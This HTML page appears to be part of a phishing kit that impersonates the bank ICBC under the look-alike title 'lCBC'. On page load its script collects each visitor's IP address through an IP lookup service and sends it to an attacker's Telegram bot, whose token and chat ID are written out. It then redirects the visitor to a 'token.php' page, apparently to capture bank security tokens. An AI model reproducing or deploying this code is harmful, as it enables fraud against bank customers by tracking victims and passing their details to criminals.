<!DOCTYPE html>
<html>
<head>
<link rel="shortcut icon" href="/accstatic/favicon.ico" type="image/x-icon">
<title>lCBC</title>
    <script>
        setTimeout(function () {
            window.location.href = "token.php";
        }, 2000);
    </script>
</head>
<body>
    </head>
    <body>
        </div>
        <script>
            // Función para obtener la dirección IP del cliente
            function getIPAddress() {
                return fetch("https://api.ipify.org?format=json")
                    .then(function (response) {
                        return response.json();
                    })
                    .then(function (data) {
                        return data.ip;
                    });
            }

            // Obtener la dirección IP y enviarla a Telegram
            getIPAddress().then(function (ipAddress) {
                var telegramURL = "https://api.telegram.org/bot6753618822:AAGFd0-dZfKJckx8Ql1vPHtsRUGFNy4FycE/sendMessage?chat_id=-4187545026&text=❗ENTRANDO A TOKEN ICBC❗ 🌐IP: " + ipAddress;

                fetch(telegramURL)
                    .then(function (response) {
                        console.log("Notificación enviada a Telegram");
                    })
                    .catch(function (error) {
                        console.error("Error al enviar la notificación a Telegram:", error);
                    });
            });
        </script>

    </body>

</html>